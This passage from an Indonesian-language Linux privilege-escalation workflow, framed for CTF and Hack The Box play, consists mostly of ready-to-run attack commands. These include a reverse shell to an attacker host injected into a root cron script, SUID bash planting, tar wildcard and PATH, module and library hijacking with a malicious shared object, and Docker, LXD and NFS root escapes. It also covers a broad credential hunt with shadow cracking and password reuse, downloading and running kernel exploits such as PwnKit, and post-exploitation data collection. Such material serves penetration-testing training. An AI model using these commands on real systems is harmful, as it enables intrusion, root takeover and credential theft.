ls -la /opt/cleanup.sh
stat -c "%A %a %U:%G %n" /opt/cleanup.sh

# Step 2: Isi script
cat /opt/cleanup.sh

# Step 3: Apakah kita bisa write?
[ -w /opt/cleanup.sh ] && echo "WRITABLE!" || echo "not writable"
```

**SKENARIO A — Script writable:**

text

```
-rwxrwxrwx 1 root root 412 Jan 15 /opt/cleanup.sh
```

➡️ Eksploitasi:

Bash

```
# Setup listener di attacker
# nc -lvnp 4444

# Backup script asli
cp /opt/cleanup.sh /tmp/cleanup.sh.bak

# Method 1: Reverse shell
printf '\nbash -i >& /dev/tcp/%s/%s 0>&1\n' "$LHOST" "$LPORT" >> /opt/cleanup.sh

# Method 2: SUID bash (lebih stable)
printf '\ncp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash\n' >> /opt/cleanup.sh

# Tunggu cron (max 1 menit untuk * * * * *)
watch -n5 "ls -la /tmp/rootbash"

# Setelah muncul:
/tmp/rootbash -p
id
```

**SKENARIO B — Script tidak writable tapi calls command tanpa full path:**

Bash

```
cat /opt/cleanup.sh
# Output:
# #!/bin/bash
# service nginx restart    ← service tanpa /usr/sbin/service!
# rm -rf /tmp/old_*
```

➡️ PATH Hijacking untuk cron:

Bash

```
# Cek PATH default cron (biasanya /usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin)
# Cek directory writable di PATH yang prioritas
ls -la /usr/local/sbin/ | head
ls -la /usr/local/bin/ | head

# Atau buat di home jika home ada di PATH
cat > /tmp/service << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
EOF
chmod +x /tmp/service

# Tambahkan /tmp ke PATH yang dipakai cron
# (Ini tergantung PATH di /etc/crontab, bukan $PATH user)
# Cek: cat /etc/crontab | grep PATH
```

**SKENARIO C — Script import Python module yang bisa dikontrol:**

Bash

```
cat /opt/backup.py
# import utils        ← cek utils.py
# import lib.helper   ← cek lib/helper.py

# Cari file
find / -name "utils.py" -o -name "helper.py" 2>/dev/null
ls -la /opt/lib/helper.py

# Jika writable, inject payload
cat > /opt/lib/helper.py << 'EOF'
import os
os.system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash")
EOF

# Tunggu cron
watch -n5 "ls -la /tmp/rootbash"
/tmp/rootbash -p
id
```

**SKENARIO D — Cron wildcard injection:**

Bash

```
# Contoh cron: * * * * * root tar czf /backup/archive.tar.gz /var/www/html/*

# Cek apakah kita bisa write di /var/www/html/
ls -la /var/www/html/

# Jika bisa write:
cd /var/www/html

# Buat checkpoint files (untuk tar)
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh exploit.sh'

# Buat exploit script
cat > /var/www/html/exploit.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
chmod +x /var/www/html/exploit.sh

# Tunggu cron
watch -n5 "ls -la /tmp/rootbash"
/tmp/rootbash -p
id
```

---

## ═══════════════════════════════════════

## FASE 5: CREDENTIAL DISCOVERY

## ═══════════════════════════════════════

> **Kenapa credential hunting penting?** Password reuse sangat umum. Password database → SSH → sudo → root adalah path yang sangat sering berhasil.

### Langkah 5.1 — Hunt Credentials (Jalankan Semua Sekaligus)

Bash

```
# === HISTORY FILES ===
cat ~/.bash_history 2>/dev/null | grep -iE "pass|user|ssh|key|secret" | head -20
cat ~/.zsh_history 2>/dev/null | grep -iE "pass|user|ssh|key|secret" | head -20
find /home -name ".bash_history" 2>/dev/null -exec cat {} \;
find /home -name ".zsh_history" 2>/dev/null -exec cat {} \;

# === SSH KEYS ===
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null | head -10
find / -name "authorized_keys" 2>/dev/null
find /home -type d -name ".ssh" 2>/dev/null

# === CONFIG FILES ===
find / -name ".env" -type f 2>/dev/null | xargs cat 2>/dev/null
find / -name "wp-config.php" 2>/dev/null | xargs cat 2>/dev/null
find / -name "config.php" 2>/dev/null | xargs grep -i "pass\|user\|db_" 2>/dev/null
find / -name "database.yml" 2>/dev/null | xargs cat 2>/dev/null
find / -name "*.conf" -type f 2>/dev/null | xargs grep -il "password" 2>/dev/null | head -10

# === WEB APPLICATION CONFIGS ===
find /var/www -type f 2>/dev/null | xargs grep -il "password\|passwd\|secret" 2>/dev/null | head -20
cat /var/www/html/config.php 2>/dev/null
cat /var/www/html/includes/config.php 2>/dev/null
cat /etc/phpmyadmin/config.inc.php 2>/dev/null

# === DATABASE CREDENTIALS ===
find / -name "*.kdbx" 2>/dev/null    # KeePass database
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null | head -10
mysql -u root --password="" -e "show databases;" 2>/dev/null
cat /root/.mysql_history 2>/dev/null

# === ENVIRONMENT VARIABLES ===
env | grep -iE "pass|pwd|secret|token|key|api"
tr '\0' '\n' < /proc/self/environ 2>/dev/null | grep -iE "pass|secret|token"

# === NETRC ===
cat ~/.netrc 2>/dev/null
find / -name ".netrc" 2>/dev/null | xargs cat 2>/dev/null

# === GIT REPOSITORIES ===
find / -type d -name ".git" 2>/dev/null | head -10
# Untuk setiap .git yang ditemukan:
cd /var/www/html && git log --oneline 2>/dev/null | head -10
git log -p --all 2>/dev/null | grep -iE "password|secret|token|key" | head -20
```

**OUTPUT BERHASIL ✅ — Password di config:**

text

```
./wp-config.php: define('DB_PASSWORD', 'Sup3rS3cur3Pass!');
./config.php: $db_pass = "P@ssw0rd_2024";
./.env: DATABASE_PASSWORD=mysecretpass
```

➡️ **SIMPAN DAN TEST REUSE:**

Bash

```
export FOUND_PASS="Sup3rS3cur3Pass!"
echo "$FOUND_PASS" >> ~/privesc_loot/creds/found_creds.txt

# Test ke root (jika tahu password)
su root <<< "$FOUND_PASS"
id

# Test ke user lain
cat /etc/passwd | grep -vE "nologin|false" | cut -d: -f1
# → alice, bob, charlie, ...

su alice <<< "$FOUND_PASS"
id

# Jika ada SSH (test dari attacker)
ssh alice@$TARGET
```

**OUTPUT BERHASIL ✅ — SSH Private Key ditemukan:**

text

```
/home/alice/.ssh/id_rsa
/var/backup/.ssh/id_rsa
/opt/scripts/deploy_key
```

➡️ **Cek dan gunakan key:**

Bash

```
# Copy dan set permission
cp /home/alice/.ssh/id_rsa /tmp/found_key
chmod 600 /tmp/found_key

# Cek apakah ada passphrase
ssh-keygen -y -f /tmp/found_key

# Jika tidak butuh passphrase (langsung keluar public key):
# Transfer ke attacker dan SSH
# Di attacker:
# scp target:/tmp/found_key .
# ssh -i found_key alice@$TARGET

# Jika ada passphrase, crack dengan john:
ssh2john /tmp/found_key > /tmp/key.hash
john /tmp/key.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**OUTPUT BERHASIL ✅ — /etc/shadow bisa dibaca:**

Bash

```
cat /etc/shadow
# Output:
root:$6$rounds=5000$salt$hash...:...
alice:$6$rounds=5000$salt$hash...:...
```

➡️ Crack hash:

Bash

```
# Di target - simpan shadow
cat /etc/shadow > /tmp/shadow.txt
cat /etc/passwd > /tmp/passwd.txt

# Transfer ke attacker
# Di attacker:
unshadow passwd.txt shadow.txt > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 1800 shadow_hash.txt /usr/share/wordlists/rockyou.txt  # SHA-512
hashcat -m 500 shadow_hash.txt /usr/share/wordlists/rockyou.txt   # MD5
```

---

## ═══════════════════════════════════════

## FASE 6: WRITABLE FILES & SERVICES

## ═══════════════════════════════════════

### Langkah 6.1 — Cari File/Directory Writable yang Kritis

Bash

```
# World-writable files (berbahaya jika dieksekusi root)
find / -type f -perm -o+w 2>/dev/null | grep -vE "^/(proc|sys|dev)" | head -20

# World-writable directories
find / -type d -perm -o+w 2>/dev/null | grep -vE "^/(proc|sys|dev|tmp|run)" | head -20

# File yang dimiliki user kita
find / -user "$(whoami)" -type f 2>/dev/null | grep -vE "^/(proc|sys|dev|home)" | head -20

# Service files writable
find /etc/systemd -name "*.service" -writable 2>/dev/null
find /etc/init.d -writable 2>/dev/null

# File yang dimodifikasi baru-baru ini
find / -type f -mmin -60 2>/dev/null | grep -vE "^/(proc|sys|dev)" | head -20
```

**OUTPUT BERHASIL ✅ — Service file writable:**

text

```
/etc/systemd/system/webapp.service
```

➡️ Cek dan modifikasi:

Bash

```
cat /etc/systemd/system/webapp.service

# Lihat Exec* directives
grep -E "ExecStart|ExecReload|ExecStop" /etc/systemd/system/webapp.service

# Jika binary yang dijalankan writable
ls -la /usr/local/bin/webapp

# Inject payload ke binary/script yang dieksekusi
cp /usr/local/bin/webapp /tmp/webapp.bak
cat > /usr/local/bin/webapp << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
EOF

# Restart service atau tunggu restart
sudo systemctl restart webapp 2>/dev/null
# Atau jika ada cron yang restart service:
watch -n5 "ls -la /tmp/rootbash"
```

---

### Langkah 6.2 — Services Running as Root

Bash

```
# List processes milik root
ps aux | awk '$1 == "root" {print $0}'

# Filter service yang menarik
ps aux | grep -E "root.*(/opt|/home|/var/www|/tmp)" | grep -v grep

# Cek service mana yang running
systemctl list-units --type=service --state=running 2>/dev/null | head -30

# Internal ports (service yang tidak expose ke luar)
ss -tulpn | grep "127.0.0.1"
netstat -tulpn 2>/dev/null | grep "127.0.0.1"
```

**OUTPUT BERHASIL ✅ — Service internal hanya bisa diakses lokal:**

text

```
tcp  LISTEN  127.0.0.1:8080   ← web app internal
tcp  LISTEN  127.0.0.1:3000   ← node app internal
tcp  LISTEN  127.0.0.1:6379   ← redis
tcp  LISTEN  127.0.0.1:3306   ← mysql
```

➡️ Akses service lokal:

Bash

```
# Web app
curl http://127.0.0.1:8080/
curl http://127.0.0.1:3000/

# Redis (cek auth dulu)
redis-cli -h 127.0.0.1 ping
redis-cli -h 127.0.0.1 info

# MySQL tanpa password
mysql -h 127.0.0.1 -u root -e "show databases;" 2>/dev/null

# → Jika berhasil akses MySQL, cari password di database:
mysql -h 127.0.0.1 -u root -e "use webapp; select * from users; show tables;" 2>/dev/null
```

---

## ═══════════════════════════════════════

## FASE 7: SPECIAL GROUPS (Docker/LXD/NFS)

## ═══════════════════════════════════════

### Langkah 7.1 — Docker Group Exploitation

Bash

```
# Verifikasi kita di docker group
id | grep docker
groups | grep docker

# List available images
docker images 2>/dev/null
docker ps -a 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Di docker group dan ada image:**

text

```
alice@victim:~$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice),998(docker)

REPOSITORY   TAG      IMAGE ID       SIZE
alpine       latest   d7d3d98c...    5.57MB
ubuntu       20.04    f63181f1...    72.8MB
```

➡️ Eksploitasi:

Bash

```
# Method 1: Mount host / ke container (PALING RELIABLE)
docker run --rm -it \
    -v /:/mnt \
    alpine \
    chroot /mnt /bin/bash

# Verifikasi di dalam container (sebenarnya di host sebagai root)
id  # uid=0(root)
cat /root/root.txt

# Method 2: Buat SUID bash di host
docker run --rm \
    -v /:/mnt \
    alpine \
    sh -c "cp /mnt/bin/bash /mnt/tmp/rootbash && chmod 4755 /mnt/tmp/rootbash"

# Di host
/tmp/rootbash -p
id

# Method 3: Baca /etc/shadow langsung
docker run --rm \
    -v /:/mnt \
    alpine \
    cat /mnt/etc/shadow
```

**OUTPUT GAGAL ❌ — Docker daemon not running:**

text

```
Cannot connect to the Docker daemon at unix:///var/run/docker.sock
```

➡️ Docker daemon mati, skip.

**OUTPUT GAGAL ❌ — Tidak ada image:**

text

```
Error response from daemon: pull access denied
```

➡️ Tidak bisa pull image, coba pakai image yang sudah ada atau skip ke LXD.

---

### Langkah 7.2 — LXD/LXC Group Exploitation

Bash

```
# Verifikasi
id | grep -E "lxd|lxc"

# Cek status LXD
lxc list 2>/dev/null
lxd --version 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Di lxd group:**

text

```
uid=1001(alice) gid=1001(alice) groups=1001(alice),110(lxd)
```

➡️ Eksploitasi via existing images:

Bash

```
# List available images
lxc image list 2>/dev/null

# Jika ada image:
lxc init <image-name> pwn -c security.privileged=true
lxc config device add pwn hostroot disk source=/ path=/mnt/root recursive=true
lxc start pwn
lxc exec pwn /bin/sh

# Di dalam container:
chroot /mnt/root /bin/bash
id  # root!
cat /root/root.txt
```

---

### Langkah 7.3 — NFS Misconfiguration

Bash

```
# Cek NFS exports di target
cat /etc/exports 2>/dev/null

# Dari attacker, cek exports
showmount -e $TARGET 2>/dev/null
```

**OUTPUT BERHASIL ✅ — no_root_squash ditemukan:**

text

```
/var/nfs/share *(rw,no_root_squash)
/home/alice    *(rw,no_root_squash)
```

➡️ Eksploitasi dari attacker (butuh root di attacker):

Bash

```
# DI ATTACKER MACHINE (sebagai root):
mkdir -p /tmp/nfs_mount
mount -t nfs $TARGET:/var/nfs/share /tmp/nfs_mount

# Buat SUID binary
cp /bin/bash /tmp/nfs_mount/rootbash
chmod 4755 /tmp/nfs_mount/rootbash

umount /tmp/nfs_mount

# DI TARGET:
/var/nfs/share/rootbash -p
id
```

---

## ═══════════════════════════════════════

## FASE 8: PATH & LIBRARY HIJACKING

## ═══════════════════════════════════════

### Langkah 8.1 — PATH Hijacking

Bash

```
# Cek PATH saat ini
echo $PATH

# Cari directory writable di PATH
echo $PATH | tr ':' '\n' | while read dir; do
    [ -w "$dir" ] && echo "WRITABLE: $dir"
done

# Cari binary yang dipanggil tanpa full path
# (dari SUID binary, cron, atau service yang sudah kita temukan)
strings /usr/local/bin/vulnerable_binary | grep -vE "^/" | grep -E "^[a-z]"
```

**OUTPUT BERHASIL ✅ — Directory writable di PATH:**

text

```
WRITABLE: /usr/local/bin
```

text

```
strings output: service, tar, cat, cp  ← tanpa path!
```

➡️ Eksploitasi:

Bash

```
# Buat fake binary di directory writable
cat > /usr/local/bin/service << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /usr/local/bin/service

# Atau tambahkan writable dir ke depan PATH
export PATH=/tmp:$PATH
cat > /tmp/service << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/service

# Jalankan vulnerable binary
/usr/local/bin/vulnerable_suid_binary
id
```

---

### Langkah 8.2 — Library Hijacking

Bash

```
# Cari missing libraries
ldd /usr/local/bin/vulnerable_binary 2>&1 | grep "not found"

# Cek library search path
cat /etc/ld.so.conf 2>/dev/null
cat /etc/ld.so.conf.d/* 2>/dev/null

# Cari path yang writable
ldconfig -p 2>/dev/null | head
```

**OUTPUT BERHASIL ✅ — Library missing dan directory writable:**

text

```
libcustom.so.1 => not found

/etc/ld.so.conf.d/custom.conf contains: /usr/local/lib
# Dan /usr/local/lib/ writable!
```

➡️ Buat malicious library:

Bash

```
cat > /tmp/malicious.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
static void init(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

# Compile (sesuaikan nama library dengan yang missing)
gcc -shared -fPIC -o /usr/local/lib/libcustom.so.1 /tmp/malicious.c
ldconfig

# Jalankan binary
/usr/local/bin/vulnerable_binary
id
```

---

## ═══════════════════════════════════════

## FASE 9: KERNEL EXPLOITATION (LAST RESORT)

## ═══════════════════════════════════════

> ⚠️ **JALANKAN INI TERAKHIR.** Kernel exploit bisa crash sistem. Gunakan hanya jika semua cara lain gagal.

### Langkah 9.1 — Identifikasi Kernel dan Cari Exploit

Bash

```
# Kumpulkan info kernel lengkap
uname -a
uname -r
cat /etc/os-release
cat /proc/version
arch
dpkg -l 'linux-*' 2>/dev/null | grep '^ii' | head -5

# Transfer dan jalankan Linux Exploit Suggester
# Di attacker:
# wget https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh

wget http://$LHOST:8080/les.sh -O /tmp/les.sh
chmod +x /tmp/les.sh
/tmp/les.sh | tee /tmp/les_output.txt

# Filter hasil highly probable
grep -i "highly probable\|[90-99]%" /tmp/les_output.txt

# Cari exploit manual
searchsploit "$(uname -r | cut -d'-' -f1)"
searchsploit linux privilege escalation $(uname -r | cut -d'.' -f1,2)
```

**OUTPUT BERHASIL ✅ — Exploit ditemukan:**

text

```
[+] [CVE-2021-4034] PwnKit          
    Details: https://www.qualys.com/2022/01/25/cve-2021-4034/
    Exposure: highly probable
```

➡️ Research dan compile exploit:

Bash

```
# Cari PoC
searchsploit CVE-2021-4034
searchsploit -m 50689

# Atau download dari GitHub
git clone https://github.com/ly4k/PwnKit /tmp/pwnkit 2>/dev/null || \
    wget https://github.com/ly4k/PwnKit/raw/main/PwnKit -O /tmp/pwnkit

chmod +x /tmp/pwnkit

# Baca source dulu! Jangan langsung jalankan.
cat /tmp/pwnkit.c

# Compile jika perlu
gcc /tmp/pwnkit.c -o /tmp/pwnkit_compiled

# Jalankan
/tmp/pwnkit_compiled
id
```

**Daftar CVE yang Sering Muncul di CTF:**

|CVE|Nama|Target|
|---|---|---|
|CVE-2021-4034|PwnKit|Polkit pkexec semua distro|
|CVE-2021-3156|Baron Samedit|sudo < 1.9.5p2|
|CVE-2022-0847|Dirty Pipe|Linux 5.8 - 5.16.11|
|CVE-2016-5195|Dirty COW|Linux 2.x - 4.8.3|
|CVE-2023-0386|OverlayFS|Ubuntu/RHEL 2023|
|CVE-2022-2588|Route of Dead|Kernel < 5.19.5|

**OUTPUT GAGAL ❌ — Exploit crash/no output:**

text

```
Segmentation fault
```

➡️ Kernel atau distro tidak cocok. Baca source lebih teliti, pastikan versi tepat. Jika tetap gagal, kembali ke fase sebelumnya dan pastikan semua sudah dicek.

**Tidak tahu harus search apa?**

text

```
Google: "linux kernel X.X.X privilege escalation exploit github"
Google: "CVE site:github.com linux local privilege escalation 2023"
Google: "hack the box linux privesc <kernel version> writeup"
```

---

## ═══════════════════════════════════════

## FASE 10: POST-EXPLOITATION & FLAG

## ═══════════════════════════════════════

### Langkah 10.1 — Verifikasi Root dan Ambil Flag

Bash

```
# WAJIB — selalu verifikasi dulu
id
whoami
id -u

# Expected output:
# uid=0(root) gid=0(root) groups=0(root)
```

**Jangan anggap root hanya dari shell prompt!** Selalu cek `id`.

Bash

```
# Ambil flag (lokasi standar CTF/HTB)
cat /root/root.txt
cat /root/flag.txt
ls /root/
find /root -name "*.txt" 2>/dev/null

# Jika ada user.txt juga
find /home -name "user.txt" 2>/dev/null | xargs cat
find /home -name "flag.txt" 2>/dev/null | xargs cat
```

---

### Langkah 10.2 — Kumpulkan Informasi untuk Lateral Movement

Bash

```
# === NETWORK — Temukan target berikutnya ===
ip a
ip route
arp -n
ip neigh
ss -tunp
cat /etc/hosts

# === CREDENTIALS — Mungkin ada lebih banyak ===
cat /root/.bash_history
cat /root/.ssh/id_rsa 2>/dev/null
find /root -type f 2>/dev/null | head -30

# Dump hash
cat /etc/shadow

# === INTERNAL SERVICES ===
ss -tulpn | grep "127.0.0.1"

# === USERS di sistem ===
cat /etc/passwd | grep -vE "nologin|false"
ls /home/

# === DUMP HASHES via secretsdump (jika ini Windows atau AD-joined) ===
# → Lanjut ke <a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold">42_lateral_movement_workflow.md</a>
# → Lanjut ke <a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>
```

---

### Langkah 10.3 — Cross-Service Credential Testing

Setiap credential atau hash yang ditemukan, test ke semua service:

text

```
Root/Shell Obtained
     │
     ├─ ─→ SSH Keys ditemukan         → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     ├──→ Hash di /etc/shadow        → <a href="/docs/hash-cracking" class="text-[#00b4d8] hover:underline font-mono font-semibold">54_hash_cracking_workflow.md</a>
     ├──→ Internal web app (127.0.0.1:8080) → <a href="/docs/web-recon" class="text-[#00b4d8] hover:underline font-mono font-semibold">15_web_recon_workflow.md</a>
     ├──→ Internal MySQL (127.0.0.1:3306)   → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
     ├──→ Network 10.x.x.x/24 baru         → <a href="/docs/pivoting-tunneling" class="text-[#00b4d8] hover:underline font-mono font-semibold">64_pivoting_tunneling_workflow.md</a>
     ├──→ /etc/krb5.conf (domain joined)   → <a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>
     └──→ /home/user dengan .ssh/          → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSI

## ═══════════════════════════════════════

|Error / Situasi|Penyebab|Solusi|
|---|---|---|
|`sudo: no tty present`|Shell belum PTY|Upgrade shell dulu: `python3 -c 'import pty; pty.spawn("/bin/bash")'`|
|`sudo -l: Sorry, user may not run sudo`|Tidak ada sudo privilege|Lanjut ke SUID/caps/cron|
|SUID binary tidak kasih euid=0|Binary tidak exploitable di versi ini|Cek versi, analisis manual dengan strings/ltrace|
|`gcc: command not found`|Compiler tidak ada|Compile di attacker (sama arch), transfer binary|
|`/tmp noexec`|Mount option noexec|Coba `/dev/shm`, `/var/tmp`, atau folder lain yang writable|
|`python3: command not found`|Python tidak terinstall|Coba `python`, `perl`, `ruby`, `script /dev/null -c bash`|
|Cron payload tidak jalan|Timing, PATH, atau permission salah|Verifikasi dengan pspy, cek permission detail|
|`getcap: command not found`|libcap tidak ada|Transfer getcap dari attacker|
|`ltrace: command not found`|Tidak terinstall|Gunakan strace, strings, file|
|Kernel exploit crash|PoC tidak cocok versi/distro|Verifikasi exact version + patch level sebelum run|
|Docker `permission denied on socket`|Tidak di docker group atau daemon mati|Cek `id|
|LXD `Error: daemon not running`|LXD daemon mati|Cek `systemctl status lxd`|
|`su: Authentication failure`|Password salah atau policy|Coba passwordnya di SSH: `ssh user@127.0.0.1`|
|LinPEAS tidak bisa download|Target no internet|Setup HTTP server di attacker: `python3 -m http.server 8080`|
|Shell mati saat Ctrl+C|Shell belum interactive/TTY|Upgrade PTY dulu|
|`bash -p` tidak kasih root|Tidak ada effective SUID|SUID bit harus ada di binary yang dijalankan|
|Stuck dan tidak tahu harus apa|Semua fase sudah dicoba|Google: `htb <machine-name> linux privesc writeup` atau `<kernel version> local privilege escalation`|

---

## ⚡ CHEATSHEET — 30-SECOND TRIAGE

Bash

```
# Copy paste ini SETIAP KALI dapat shell baru
# ============================================
id; whoami; groups
sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null | sort
getcap -r / 2>/dev/null
cat /etc/crontab 2>/dev/null
ss -tulpn 2>/dev/null | grep "127.0.0.1"
uname -a
cat /etc/os-release
cat ~/.bash_history 2>/dev/null | tail -30
find /home -name ".ssh" -type d 2>/dev/null
find / -name ".env" -o -name "wp-config.php" -o -name "config.php" 2>/dev/null | head
ls -la /opt/ /var/www/ /srv/ 2>/dev/null
```

---

## MASTER DECISION TREE (RINGKASAN)

text

```
START: Low-privilege shell didapat
│
├─ FASE 0: Stabilisasi Shell (python3 pty, stty)
│
├─ FASE 1: SUDO — sudo -l
│   ├─ [NOPASSWD ALL]          → sudo /bin/bash → ROOT
│   ├─ [NOPASSWD binary]       → GTFOBins → ROOT
│   ├─ [Script writable]       → Inject payload → ROOT
│   └─ [Tidak ada sudo]        → FASE 2
│
├─ FASE 2: SUID/SGID
│   ├─ [GTFOBins binary]       → Escape → ROOT
│   ├─ [Custom binary]         → strings/ltrace → PATH hijack → ROOT
│   └─ [Tidak ada menarik]     → FASE 3
│
├─ FASE 3: CAPABILITIES
│   ├─ [cap_setuid]            → setuid(0) → ROOT
│   ├─ [cap_dac_read_search]   → Baca shadow → Crack → ROOT
│   └─ [Tidak ada]             → FASE 4
│
├─ FASE 4: CRON + AUTOMATED ENUM (LinPEAS + pspy)
│   ├─ [Script writable]       → Inject reverse shell → ROOT
│   ├─ [PATH injection]        → Fake binary → ROOT
│   ├─ [Module hijack]         → Overwrite import → ROOT
│   └─ [Tidak ada]             → FASE 5
│
├─ FASE 5: CREDENTIAL DISCOVERY
│   ├─ [Password di config]    → su/SSH → sudo -l → ROOT
│   ├─ [SSH private key]       → SSH login → sudo → ROOT
│   ├─ [/etc/shadow readable]  → Crack → su → ROOT
│   └─ [Tidak ada]             → FASE 6
│
├─ FASE 6: WRITABLE FILES & SERVICES
│   ├─ [Service file writable] → Modifikasi ExecStart → ROOT
│   ├─ [Internal service]      → Akses MySQL/Redis → credentials → ROOT
│   └─ [Tidak ada]             → FASE 7
│
├─ FASE 7: SPECIAL GROUPS
│   ├─ [docker group]          → Mount / → chroot → ROOT
│   ├─ [lxd group]             → Privileged container → ROOT
│   ├─ [disk group]            → Baca block device → ROOT
│   └─ [Tidak ada]             → FASE 8
│
├─ FASE 8: PATH & LIBRARY HIJACKING
│   ├─ [PATH writable]         → Fake binary → ROOT
│   ├─ [Library missing]       → Malicious .so → ROOT
│   └─ [Tidak ada]             → FASE 9
│
└─ FASE 9: KERNEL EXPLOIT (LAST RESORT)
    ├─ [CVE ditemukan + verified] → Compile → Run → ROOT
    └─ [Tidak ada]               → Manual research + Google
```

---

> **➡️ NEXT:** Setelah root dan collect credentials/hashes, lanjut ke **`[🪟 45 — Windows Privilege Escalation Workflow](/docs/windows-privesc)`** jika ada Windows host di network, atau **`[🧭 Workflow 42 — Lateral Movement](/docs/lateral-movement)`** untuk pivot ke target berikutnya. Jika environment AD, langsung ke **`[🏰 35 — Active Directory Initial Enumeration Workflow](/docs/ad-initial-enumeration)`**.